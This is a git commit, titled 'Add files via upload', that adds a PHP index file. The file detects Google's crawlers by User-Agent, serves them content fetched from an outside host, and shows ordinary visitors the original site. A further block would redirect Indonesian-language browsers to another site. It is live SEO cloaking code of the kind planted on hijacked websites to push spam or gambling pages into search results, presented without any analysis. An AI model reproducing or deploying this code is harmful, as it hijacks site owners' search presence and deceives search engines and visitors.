8a0c22b22282af2a25ce1fa3ebfc88ca74fe70d3
agustox12a <153891152+agustox12a@users.noreply.github.com>
2025-11-25 22:54:53 +0700

    Add files via upload

---
+++ index 3.php
@@ -0,0 +1,22 @@
+<?php
+function is_google_bot() {
+    $agents = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News");
+    foreach ($agents as $agent) {
+        if (strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) return true;
+    }
+    return false;
+}
+if (is_google_bot()) {
+    $bot_content = file_get_contents('https://pergijauh.click/ampun-bang/haha.txt');
+    echo $bot_content;
+    exit;
+} else {
+    include('index-old.php');
+    exit;
+}
+$browserLang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
+if ($browserLang == 'id') {
+    header("Location: https://hatory-x-burboyy.pages.dev/");
+    exit;
+}
+?>
